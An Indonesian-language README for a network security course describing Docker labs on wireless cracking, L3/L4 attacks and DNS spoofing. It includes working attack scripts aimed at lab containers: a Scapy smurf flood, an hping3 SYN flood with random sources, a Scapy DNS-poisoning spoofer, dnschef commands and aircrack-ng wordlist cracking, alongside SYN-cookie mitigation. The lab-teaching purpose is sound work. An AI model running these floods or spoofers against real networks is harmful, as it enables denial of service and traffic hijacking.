# 🐳 Docker Labs untuk Network Security Course

Dokumentasi lengkap untuk menjalankan lab dengan Docker dalam Network Security Course.

## 📋 Daftar Isi

1. [Prerequisites](#prerequisites)
2. [Quick Start](#quick-start)
3. [Lab Pertemuan 4: Wireless Security](#lab-pertemuan-4-wireless-security)
4. [Lab Pertemuan 5: L3 Security](#lab-pertemuan-5-l3-security)
5. [Lab Pertemuan 6: L4 Security](#lab-pertemuan-6-l4-security)
6. [Lab Pertemuan 7: DNS Security](#lab-pertemuan-7-dns-security)
7. [Troubleshooting](#troubleshooting)
8. [Tips & Best Practices](#tips--best-practices)

---

## Prerequisites

### Instalasi Docker

**Windows / Mac:**
1. Download [Docker Desktop](https://www.docker.com/products/docker-desktop)
2. Install dan restart komputer
3. Verifikasi: `docker --version`

**Linux:**
```bash
curl -fsSL https://get.docker.com -o get-docker.sh
sudo bash get-docker.sh

# Add user ke docker group (opsional, tapi recommended)
sudo usermod -aG docker $USER
# Restart untuk apply perubahan
```

### Verifikasi Instalasi

```bash
# Check Docker
docker --version
# Output: Docker version 24.x.x

# Check Docker Compose
docker-compose --version
# Output: Docker Compose version 2.x.x

# Test docker berjalan
docker run hello-world
```

---

## Quick Start

Langkah tercepat untuk memulai lab mana saja:

```bash
# 1. Clone atau download course materials
cd ~/workspace
git clone https://github.com/yourrepo/Network-Security-Course-Bank.git
cd Network-Security-Course-Bank/Labs

# 2. Pilih lab yang ingin dijalankan
cd pertemuan-4-wireless  # atau p5-l3, p6-l4, p7-dns

# 3. Start containers
docker-compose up -d

# 4. Verify containers berjalan
docker-compose ps

# 5. Masuk container
docker-compose exec <service-name> bash
```

---

## Lab Pertemuan 4: Wireless Security

### Lokasi File
- Docker Compose: `docker-compose-p4.yml`
- Folder Lab: `p4-wireless/`

### Services yang Tersedia

| Container | IP | Fungsi |
|-----------|---|--------|
| kali-wireless-lab | 192.168.100.2 | Attacker (aircrack-ng tools) |
| wifi-ap-target | 192.168.100.3 | Target AP simulator |
| burp-suite | 192.168.100.4 | Traffic intercepting |

### Cara Menjalankan

```bash
cd ~/Network-Security-Course-Bank/Labs
mkdir -p p4-wireless && cd p4-wireless

# Copy docker-compose file
cp ../docker-compose-p4.yml .

# Start lab
docker-compose up -d

# Masuk ke Kali
docker-compose exec kali-wireless-lab bash

# Di dalam container Kali:
aircrack-ng --version
airodump-ng --help

# Verifikasi tools
which aircrack-ng airbase-ng aireplay-ng
```

### Praktik Dasar

**Monitor jaringan:**
```bash
docker-compose exec kali-wireless-lab bash
airodump-ng wlan0mon
```

**Setup wordlist:**
```bash
mkdir wordlists/
cat > wordlists/custom-wordlist.txt << 'EOF'
password123
wifipassword
router12345
EOF

# Dari container Kali:
aircrack-ng capture.cap -w /tmp/wordlists/custom-wordlist.txt
```

### Cleanup

```bash
docker-compose down
docker-compose down -v  # Including volumes
```

---

## Lab Pertemuan 5: L3 Security

### Lokasi File
- Docker Compose: `docker-compose-p5.yml`
- Folder Lab: `p5-l3/`

### Services yang Tersedia

| Container | IP | Fungsi |
|-----------|---|--------|
| attacker-l3 | 192.168.50.2 | Kali attacker |
| target-l3 | 192.168.50.3 | Vulnerable target |
| dhcp-server | 192.168.50.4 | DHCP untuk starvation |
| monitor-l3 | 192.168.50.5 | Monitoring container |

### Setup Lab

```bash
cd ~/Network-Security-Course-Bank/Labs
mkdir -p p5-l3 && cd p5-l3

cp ../docker-compose-p5.yml .
docker-compose up -d

# Verify
docker-compose ps
```

### Praktik

**Terminal 1 - Monitor:**
```bash
docker-compose exec monitor-l3 bash
tcpdump -i eth0 -n icmp
```

**Terminal 2 - Attacker:**
```bash
docker-compose exec attacker-l3 bash

# Smurf attack simulation
python3 << 'PYTHON'
from scapy.all import *
target = "192.168.50.3"
broadcast = "192.168.50.255"

# ICMP Echo request ke broadcast dengan source = target
pkt = IP(src=target, dst=broadcast)/ICMP()
send(pkt, loop=1, inter=0.5)
PYTHON
```

**Terminal 3 - Target Monitor:**
```bash
docker-compose exec target-l3 bash
watch -n 1 'netstat -an | grep ESTABLISHED | wc -l'
```

---

## Lab Pertemuan 6: L4 Security

### Lokasi File
- Docker Compose: `docker-compose-p6.yml`
- Folder Lab: `p6-l4/`

### Services yang Tersedia

| Container | IP:Port | Fungsi |
|-----------|---|--------|
| attacker-l4 | 192.168.60.2 | Kali attacker |
| target-webserver | 192.168.60.3:80 | Nginx web server |
| target-udp | 192.168.60.4:5353/UDP | DNS amplification target |
| monitor-l4 | 192.168.60.5 | Monitoring |

### Setup Lab

```bash
cd ~/Network-Security-Course-Bank/Labs
mkdir -p p6-l4 && cd p6-l4

cp ../docker-compose-p6.yml .
docker-compose up -d
```

### Praktik SYN Flood

**Terminal 1 - Monitor Target Connections:**
```bash
docker-compose exec target-webserver bash

# Watch half-open connections
watch -n 1 "netstat -atn | grep SYN_RECV | wc -l"
```

**Terminal 2 - Monitor Packets:**
```bash
docker-compose exec monitor-l4 bash
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -c 100
```

**Terminal 3 - Launch Attack:**
```bash
docker-compose exec attacker-l4 bash

# SYN Flood dengan hping3
hping3 -S --flood --rand-source -p 80 192.168.60.3
# Stop dengan Ctrl+C setelah 10-15 detik
```

**Analisis hasil:**
```bash
# Di target, lihat jumlah SYN_RECV
netstat -atn | grep SYN_RECV | wc -l
# Expected: 100+ half-open connections
```

### Mitigasi

**Aktifkan SYN Cookies:**
```bash
docker-compose exec target-webserver bash

sysctl -w net.ipv4.tcp_syncookies=1
sysctl net.ipv4.tcp_syncookies  # Verify = 1
```

**Coba attack lagi:**
```bash
# Di attacker, launch attack baru
hping3 -S --flood --rand-source -p 80 192.168.60.3

# Di target, SYN_RECV lebih rendah karena SYN cookies aktif
```

---

## Lab Pertemuan 7: DNS Security

### Lokasi File
- Docker Compose: `docker-compose-p7.yml`
- Folder Lab: `p7-dns/`

### Services yang Tersedia

| Container | IP:Port | Fungsi |
|-----------|---|--------|
| attacker-dns | 192.168.70.2 | Attacker (dnschef, scapy) |
| dns-resolver | 192.168.70.3:53 | BIND9 Recursive resolver |
| dns-auth | 192.168.70.4:5353 | BIND9 Authoritative NS |
| web-target | 192.168.70.5:80 | Phishing target |
| client-dns | 192.168.70.6 | Testing client |
| monitor-dns | 192.168.70.7 | Analysis container |

### Setup Lab

```bash
cd ~/Network-Security-Course-Bank/Labs
mkdir -p p7-dns && cd p7-dns

cp ../docker-compose-p7.yml .
docker-compose up -d
```

### Praktik DNS Queries

**Test DNS resolution:**
```bash
docker-compose exec client-dns bash

# Query ke resolver
dig @192.168.70.3 google.com
nslookup example.com 192.168.70.3

# Query ke authoritative
dig @192.168.70.4 -p 5353 mycompany.local
```

### Praktik DNS Poisoning

**Terminal 1 - Monitor DNS queries:**
```bash
docker-compose exec monitor-dns bash
tcpdump -i eth0 -n port 53 -A
```

**Terminal 2 - Launch Poisoning:**
```bash
docker-compose exec attacker-dns bash

# Gunakan dnschef untuk spoof
dnschef --fakeip 192.168.70.2 --fakedomains targetsite.com \
        --interface 192.168.70.2 --nameserver 192.168.70.3

# Atau gunakan Python script dengan Scapy
python3 << 'PYTHON'
from scapy.all import *

def spoof_dns(pkt):
    if DNSQR in pkt and b"targetsite.com" in pkt[DNSQR].qname:
        spoofed_pkt = IP(dst=pkt[IP].src, src="192.168.70.3") / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, 
                                  rdata="192.168.70.2"))
        send(spoofed_pkt, verbose=0)
        print(f"[+] Poisoned: {pkt[DNSQR].qname.decode()}")

sniff(filter="udp port 53", prn=spoof_dns, store=0)
PYTHON
```

**Terminal 3 - Client mencoba resolve:**
```bash
docker-compose exec client-dns bash

# Query akan di-redirect ke attacker IP
dig @192.168.70.3 targetsite.com

# Result akan menunjuk ke 192.168.70.2 (attacker)
```

---

## Troubleshooting

### Container tidak start

**Error: "bind: address already in use"**
```bash
# Port sudah digunakan process lain
# Check apa yang menggunakan port
netstat -tuln | grep LISTEN

# Option 1: Kill process yang menggunakan port
# Option 2: Change port di docker-compose.yml
# Option 3: Stop container yang lain
docker-compose down
```

**Error: "permission denied while trying to connect to Docker daemon"**
```bash
# Linux only - tambah user ke docker group
sudo usermod -aG docker $USER
newgrp docker

# Atau gunakan sudo
sudo docker-compose up -d
```

### Container crash

**Check logs:**
```bash
docker-compose logs <container-name>

# Follow logs in real-time
docker-compose logs -f <container-name>
```

### Network issues

**Container tidak bisa communicate:**
```bash
# Check network
docker network ls
docker network inspect <network-name>

# Test connectivity dari container
docker-compose exec attacker-l3 ping target-l3
```

**Jika ping tidak bekerja:**
```bash
# Cek IP address
docker-compose exec target-l3 ip addr show

# Restart container
docker-compose restart target-l3
```

---

## Tips & Best Practices

### 1. Organize Labs

```bash
# Struktur folder recommended
Labs/
├── docker-compose-p4.yml
├── docker-compose-p5.yml
├── ...
├── p4-wireless/
│   ├── captures/
│   ├── wordlists/
│   └── docker-compose.yml
├── p5-l3/
│   ├── captures-l3/
│   └── docker-compose.yml
└── README.md
```

### 2. Backup Captures

```bash
# Copy PCAP files before docker-compose down
cp p5-l3/captures/* ~/backups/pcap-captures/

# PCAP files berguna untuk analisis di Wireshark nanti
```

### 3. Use Named Volumes

```bash
# Di docker-compose.yml, gunakan named volumes
volumes:
  pcap-captures:
    driver: local

# Lebih mudah di-backup dan di-share antar container
```

### 4. Scale Up Lab

```bash
# Kalau butuh multiple attackers, modify docker-compose.yml
services:
  attacker-l3-1:
    # ...
  attacker-l3-2:
    # ...

# Run multiple serangan simultaneously
docker-compose up -d attacker-l3-1 attacker-l3-2
```

### 5. Monitor Resources

```bash
# Check container resource usage
docker stats

# Limit resource jika needed
docker-compose.yml:
  services:
    attacker-l4:
      # ...
      cpus: '0.5'
      memory: '512m'
```

### 6. Persistent Data

```bash
# Mount local folder untuk persistent data
docker-compose.yml:
  volumes:
    - ./pcaps:/tmp/captures  # Host path:Container path
    - ./scripts:/app/scripts
```

### 7. Clean Up

```bash
# Remove stopped containers
docker container prune

# Remove unused images
docker image prune

# Remove everything (careful!)
docker system prune -a
```

---

## Video Walkthrough (Optional)

Setiap lab memiliki video penjelasan step-by-step di folder yang sama.

---

## FAQ

**Q: Bisa jalankan banyak lab sekaligus?**  
A: Bisa, selama port tidak conflict. Ubah port di docker-compose.yml.

**Q: Gimana kalau butuh akses GUI?**  
A: Lab ini CLI-based. Untuk GUI tools, gunakan X11 forwarding atau VNC.

**Q: Data hilang setelah docker-compose down?**  
A: Gunakan `-v` hanya jika ingin hapus volumes. Tanpa `-v`, data persist.

**Q: Bisa edit docker-compose.yml?**  
A: Tentu! Customize sesuai kebutuhan. Contoh: ubah subnet, add services, etc.

---

Selamat belajar! 🚀
